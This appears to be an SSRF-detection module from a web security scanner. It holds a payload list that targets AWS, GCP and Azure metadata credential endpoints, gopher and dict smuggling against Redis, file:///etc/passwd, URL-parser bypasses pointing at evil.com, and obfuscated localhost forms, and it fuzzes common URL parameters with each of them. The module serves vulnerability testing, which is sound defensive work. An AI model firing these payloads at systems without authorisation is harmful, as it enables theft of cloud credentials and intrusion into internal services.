from __future__ import annotations

import asyncio

from ..core.models import Finding, Severity

# SSRF targets covering multiple cloud providers and internal services
TARGETS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v2/instance/",
    # IBM Cloud
    "http://169.254.169.254/metadata/v1/instance",
    # Tencent Cloud
    "http://metadata.tencentyun.com/latest/meta-data/",
    # Huawei Cloud
    "http://169.254.169.254/openstack/latest/meta_data.json",
    # Internal services
    "http://127.0.0.1/",
    "http://localhost/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://0.0.0.0/",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "ftp://127.0.0.1/",
    # URL parser bypasses
    "http://127.0.0.1@evil.com/",
    "http://evil.com#@127.0.0.1/",
    "http://127.0.0.1%2f@evil.com/",
    "http://[::1]/",
    "http://0177.0.0.1/",
    "http://2130706433/",
    "http://0x7f000001/",
]

# Specific indicators that only appear in actual internal/cloud responses
SSRF_INDICATORS = (
    "ami-id", "instance-id", "ami-launch-index", "security-credentials",
    "computeMetadata", "instance", "hostname", "root:x:", "daemon:",
    "redis_version", "memcached", "mongodb",
)

# Common parameters to test
PARAMS = [
    "url", "next", "redirect", "dest", "target", "uri", "callback",
    "path", "src", "source", "href", "link", "image", "file", "doc",
    "proxy", "forward", "fetch", "load", "request", "webhook", "endpoint",
    "api_url", "service", "host", "domain", "server", "feed", "data",
    "resource", "site", "html", "page", "ref", "reference",
]


async def _probe(ctx, base: str, param: str, ssrf_target: str) -> bool:
    if not ctx.can_request():
        return False
    ctx.increment()
    baseline_resp = await ctx.http.get(base, params={param: "https://example.com"}, timeout=ctx.settings.timeout)
    baseline_body = (baseline_resp.text or "").lower()
    if not ctx.can_request():
        return False
    ctx.increment()
    resp = await ctx.http.get(base, params={param: ssrf_target}, timeout=ctx.settings.timeout)
    body = (resp.text or "").lower()
    new_indicators = [ind for ind in SSRF_INDICATORS if ind in body and ind not in baseline_body]
    return len(new_indicators) > 0


async def run(ctx) -> None:
    base = f"https://{ctx.target}"

    # Add OOB targets if callback server is configured
    oob_targets = list(TARGETS)
    oob_domain = getattr(ctx.settings, "oob_domain", None)
    if oob_domain:
        oob_targets.append(f"http://{oob_domain}/ssrf-probe")
        oob_targets.append(f"https://{oob_domain}/ssrf-probe")

    async def _probe_param(param: str) -> None:
        for ssrf_target in oob_targets:
            if not ctx.can_request():
                return
            found = await _probe(ctx, base, param, ssrf_target)
            if found:
                ctx.add_finding(Finding(
                    id=f"ssrf-{param}",
                    title=f"Potential SSRF via '{param}' parameter",
                    severity=Severity.HIGH,
                    confidence=0.7,
                    asset=f"{base}?{param}={ssrf_target}",
                    module="ssrf",
                    description="Response suggests internal resource access.",
                    remediation="Validate and allowlist outbound URLs; block internal ranges and protocols.",
                    tags=["ssrf"],
                ))
                return

    tasks = [_probe_param(param) for param in PARAMS]
    await asyncio.gather(*tasks, return_exceptions=True)